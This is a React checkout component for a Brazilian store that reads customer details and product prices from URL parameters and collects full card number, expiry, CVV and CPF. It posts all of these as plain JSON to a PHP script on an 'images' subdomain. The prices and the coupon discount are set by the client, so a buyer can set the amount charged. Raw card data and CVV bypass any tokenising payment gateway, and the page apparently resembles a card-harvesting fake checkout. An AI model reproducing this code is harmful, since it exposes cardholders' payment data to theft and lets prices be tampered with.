import React, { useState, useEffect } from 'react';
import { useSearchParams } from 'react-router-dom';
import styles from './CardPayment.module.css';

const API_BASE = 'https://images.newandrews.com.br/card-payment';

export default function CardPaymentPage() {
    const [searchParams] = useSearchParams();
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);
    const [products, setProducts] = useState([]);
    const [totalValue, setTotalValue] = useState(0);
    const [cupom, setCupom] = useState('NONE');
    const [customerData, setCustomerData] = useState({});
    const [paymentMethod, setPaymentMethod] = useState('credit');
    const [installments, setInstallments] = useState(1);
    const [installmentOptions, setInstallmentOptions] = useState([]);

    // Card form fields
    const [cardNumber, setCardNumber] = useState('');
    const [cardName, setCardName] = useState('');
    const [expiryMonth, setExpiryMonth] = useState('');
    const [expiryYear, setExpiryYear] = useState('');
    const [cvv, setCvv] = useState('');
    const [cpfTitular, setCpfTitular] = useState('');

    // Validation errors
    const [errors, setErrors] = useState({});

    useEffect(() => {
        const params = Object.fromEntries(searchParams.entries());

        setCustomerData({
            email: params.email,
            name: decodeURIComponent(params.name || ''),
            cpf: params.cpf,
            phone: params.phone,
            postal_code: params.postal_code,
            street: decodeURIComponent(params.street || ''),
            number: params.number,
            neighborhood: decodeURIComponent(params.neighborhood || ''),
            city: decodeURIComponent(params.city || ''),
            state: params.state,
        });

        // Build products array
        const prods = [];
        let index = 1;
        while (true) {
            const nameKey = index === 1 ? 'productsName' : `productsName${index}`;
            const priceKey = index === 1 ? 'productsPrice' : `productsPrice${index}`;
            const qtyKey = index === 1 ? 'productsQuantity' : `productsQuantity${index}`;

            const name = params[nameKey];
            const price = params[priceKey];
            const quantity = params[qtyKey];

            if (!name && !price && !quantity) break;

            prods.push({
                description: decodeURIComponent(name || ''),
                quantity: parseInt(quantity || '0', 10),
                price_unit: parseFloat(price || '0')
            });
            index++;
        }
        if (prods.length === 0 && params.productsName) {
            prods.push({
                description: decodeURIComponent(params.productsName),
                quantity: parseInt(params.productsQuantity || '0', 10),
                price_unit: parseFloat(params.productsPrice || '0')
            });
        }
        setProducts(prods);

        const rawTotal = prods.reduce((acc, p) => acc + p.price_unit * p.quantity, 0);
        const cupomParam = params.cupom || 'NONE';
        setCupom(cupomParam);
        let finalTotal = rawTotal;
        if (cupomParam !== 'NONE' && cupomParam.trim() !== '') {
            finalTotal = rawTotal * 0.9;
        }
        setTotalValue(finalTotal);
    }, [searchParams]);

    // Generate installment options
    useEffect(() => {
        if (paymentMethod === 'credit' && totalValue > 0) {
            const maxInstallments = 6;
            const options = [];
            for (let i = 1; i <= maxInstallments; i++) {
                const value = totalValue / i;
                options.push({
                    number: i,
                    value,
                    display: `${i}x de R$ ${value.toFixed(2)} sem juros`
                });
            }
            setInstallmentOptions(options);
            setInstallments(1);
        } else {
            setInstallmentOptions([]);
            setInstallments(1);
        }
    }, [paymentMethod, totalValue]);

    // Validation functions
    const isValidCardNumber = (num) => {
        const cleaned = num.replace(/\D/g, '');
        if (cleaned.length < 13 || cleaned.length > 19) return false;
        let sum = 0, alternate = false;
        for (let i = cleaned.length - 1; i >= 0; i--) {
            let n = parseInt(cleaned[i], 10);
            if (alternate) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            sum += n;
            alternate = !alternate;
        }
        return sum % 10 === 0;
    };

    const isValidExpiry = (month, year) => {
        const m = parseInt(month, 10);
        const y = parseInt(year, 10);
        if (isNaN(m) || isNaN(y) || m < 1 || m > 12) return false;
        const now = new Date();
        const expiry = new Date(y, m - 1, 1);
        expiry.setMonth(expiry.getMonth() + 1);
        return expiry > now;
    };

    const isValidCPF = (cpf) => {
        const cleaned = cpf.replace(/\D/g, '');
        if (!/^\d{11}$/.test(cleaned)) return false;
        if (/^(\d)\1+$/.test(cleaned)) return false;
        let soma = 0, resto;
        for (let i = 1; i <= 9; i++) soma += parseInt(cleaned.substring(i - 1, i)) * (11 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        if (resto !== parseInt(cleaned.substring(9, 10))) return false;
        soma = 0;
        for (let i = 1; i <= 10; i++) soma += parseInt(cleaned.substring(i - 1, i)) * (12 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        return resto === parseInt(cleaned.substring(10, 11));
    };

    const validateForm = () => {
        const newErrors = {};

        const cardNumClean = cardNumber.replace(/\D/g, '');
        if (!isValidCardNumber(cardNumClean)) {
            newErrors.cardNumber = 'Número do cartão inválido';
        }

        if (cardName.trim().length < 5 || !cardName.includes(' ')) {
            newErrors.cardName = 'Digite o nome completo como no cartão';
        }

        if (!isValidExpiry(expiryMonth, expiryYear)) {
            newErrors.expiry = 'Data de validade inválida ou vencida';
        }

        const cvvClean = cvv.replace(/\D/g, '');
        if (!/^\d{3,4}$/.test(cvvClean)) {
            newErrors.cvv = 'CVV inválido (3 ou 4 dígitos)';
        }

        if (!isValidCPF(cpfTitular)) {
            newErrors.cpfTitular = 'CPF inválido';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!validateForm()) return;

        setLoading(true);
        setError(null);

        const payment_method_id = paymentMethod === 'credit' ? '3' : '4';

        const payload = {
            finger_print: '',
            email: customerData.email,
            name: customerData.name,
            cpf: customerData.cpf,
            phone: customerData.phone,
            postal_code: customerData.postal_code,
            street: customerData.street,
            number: customerData.number,
            neighborhood: customerData.neighborhood,
            city: customerData.city,
            state: customerData.state,
            cupom: cupom,
            products: products,
            card_number: cardNumber.replace(/\s/g, ''),
            card_name: cardName,
            expiry_month: expiryMonth,
            expiry_year: expiryYear,
            cvv: cvv,
            cpf_titular: cpfTitular.replace(/\D/g, ''),
            installments: installments.toString(),
            payment_method_id
        };

        try {
            const res = await fetch(`${API_BASE}/index.php`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await res.json();
            if (!res.ok || !data.success) {
                throw new Error(data.error || 'Erro no processamento do pagamento');
            }
            window.location.href = data.redirect;
        } catch (err) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    const formatCardNumber = (value) => {
        const v = value.replace(/\s/g, '').replace(/\D/g, '').slice(0, 16);
        const parts = v.match(/.{1,4}/g);
        return parts ? parts.join(' ') : v;
    };

    const handleCardNumberChange = (e) => {
        const formatted = formatCardNumber(e.target.value);
        setCardNumber(formatted);
    };

    const handleCpfChange = (e) => {
        const val = e.target.value.replace(/\D/g, '').slice(0, 11);
        setCpfTitular(val);
    };

    const handleExpiryMonthChange = (e) => {
        const val = e.target.value.replace(/\D/g, '').slice(0, 2);
        setExpiryMonth(val);
    };

    const handleExpiryYearChange = (e) => {
        const val = e.target.value.replace(/\D/g, '').slice(0, 4);
        setExpiryYear(val);
    };

    const handleCvvChange = (e) => {
        const val = e.target.value.replace(/\D/g, '').slice(0, 4);
        setCvv(val);
    };

    return (
        <div className={styles.container}>
            <div className={styles.paymentBox}>
                <h2 className={styles.title}>Pagamento com Cartão</h2>
                <p className={styles.total}>Total: R$ {totalValue.toFixed(2)}</p>

                {error && <div className={styles.error}>{error}</div>}

                <form onSubmit={handleSubmit} className={styles.form}>
                    <div className={styles.paymentMethod}>
                        <label className={styles.radioLabel}>
                            <input
                                type="radio"
                                name="paymentMethod"
                                value="credit"
                                checked={paymentMethod === 'credit'}
                                onChange={() => setPaymentMethod('credit')}
                            />
                            Crédito
                        </label>
                        <label className={styles.radioLabel}>
                            <input
                                type="radio"
                                name="paymentMethod"
                                value="debit"
                                checked={paymentMethod === 'debit'}
                                onChange={() => setPaymentMethod('debit')}
                            />
                            Débito
                        </label>
                    </div>

                    <div className={styles.formGroup}>
                        <label htmlFor="cardNumber">Número do Cartão</label>
                        <input
                            type="text"
                            id="cardNumber"
                            value={cardNumber}
                            onChange={handleCardNumberChange}
                            placeholder="1234 5678 9012 3456"
                            maxLength="19"
                            className={errors.cardNumber ? styles.errorInput : ''}
                        />
                        {errors.cardNumber && <span className={styles.errorText}>{errors.cardNumber}</span>}
                    </div>

                    <div className={styles.formGroup}>
                        <label htmlFor="cardName">Nome do Titular</label>
                        <input
                            type="text"
                            id="cardName"
                            value={cardName}
                            onChange={(e) => setCardName(e.target.value)}
                            placeholder="Como está no cartão"
                            className={errors.cardName ? styles.errorInput : ''}
                        />
                        {errors.cardName && <span className={styles.errorText}>{errors.cardName}</span>}
                    </div>

                    <div className={styles.row}>
                        <div className={styles.formGroup}>
                            <label htmlFor="expiryMonth">Mês (MM)</label>
                            <input
                                type="text"
                                id="expiryMonth"
                                value={expiryMonth}
                                onChange={handleExpiryMonthChange}
                                placeholder="MM"
                                maxLength="2"
                                className={errors.expiry ? styles.errorInput : ''}
                            />
                        </div>
                        <div className={styles.formGroup}>
                            <label htmlFor="expiryYear">Ano (AAAA)</label>
                            <input
                                type="text"
                                id="expiryYear"
                                value={expiryYear}
                                onChange={handleExpiryYearChange}
                                placeholder="AAAA"
                                maxLength="4"
                                className={errors.expiry ? styles.errorInput : ''}
                            />
                        </div>
                        <div className={styles.formGroup}>
                            <label htmlFor="cvv">CVV</label>
                            <input
                                type="text"
                                id="cvv"
                                value={cvv}
                                onChange={handleCvvChange}
                                placeholder="123"
                                maxLength="4"
                                className={errors.cvv ? styles.errorInput : ''}
                            />
                        </div>
                    </div>
                    {errors.expiry && <span className={styles.errorText}>{errors.expiry}</span>}

                    <div className={styles.formGroup}>
                        <label htmlFor="cpfTitular">CPF do Titular</label>
                        <input
                            type="text"
                            id="cpfTitular"
                            value={cpfTitular}
                            onChange={handleCpfChange}
                            placeholder="00000000000"
                            maxLength="11"
                            className={errors.cpfTitular ? styles.errorInput : ''}
                        />
                        {errors.cpfTitular && <span className={styles.errorText}>{errors.cpfTitular}</span>}
                    </div>

                    {paymentMethod === 'credit' && installmentOptions.length > 0 && (
                        <div className={styles.formGroup}>
                            <label htmlFor="installments">Parcelas</label>
                            <select
                                id="installments"
                                value={installments}
                                onChange={(e) => setInstallments(parseInt(e.target.value, 10))}
                            >
                                {installmentOptions.map(opt => (
                                    <option key={opt.number} value={opt.number}>{opt.display}</option>
                                ))}
                            </select>
                        </div>
                    )}

                    <button type="submit" className={styles.submitButton} disabled={loading}>
                        {loading ? 'Processando...' : 'Finalizar Pagamento'}
                    </button>

                    <button type="button" className={styles.submitButtonBack} onClick={() => window.history.back()} disabled={loading}>
                        Voltar
                    </button>
                </form>
            </div>
        </div>
    );
}